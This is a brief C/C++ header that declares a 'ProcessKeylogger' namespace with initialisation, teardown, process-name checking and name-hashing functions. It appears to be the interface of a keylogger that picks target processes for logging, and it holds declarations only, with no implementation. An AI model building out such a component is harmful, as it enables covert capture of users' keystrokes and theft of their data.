

namespace ProcessKeylogger
{
	void init(void);

	void uninit(void);

	void _checkProcessForLogging(LPSTR processName);

	LPSTR _name2hash(LPSTR name);

}